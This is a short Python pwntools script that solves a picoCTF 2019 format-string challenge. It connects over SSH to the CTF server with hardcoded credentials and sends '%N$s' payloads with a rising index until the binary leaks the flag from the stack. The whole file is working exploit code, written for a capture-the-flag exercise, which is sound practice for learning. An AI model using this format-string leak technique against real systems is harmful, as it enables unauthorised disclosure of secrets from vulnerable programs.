from pwn import *
import re

try:
    session = ssh(host='2019shell1.picoctf.com', user='cse331', password='3curityishard', level=50)
    i = 1
    while (True):
        p = session.process(cwd='/problems/stringzz_2_a90e0d8339487632cecbad2e459c71c4', executable='./vuln')
        p.sendlineafter(':', f'%{i}$s')
        recvl = p.recvall()
        p.close()

        if 'pico' in str(recvl):
            break;

        i = i + 1

    flag = re.search(r"picoCTF{(.*)}", str(recvl))
    print(flag.groups()[0])
    p.close()
except:
    print('lost connection to server')
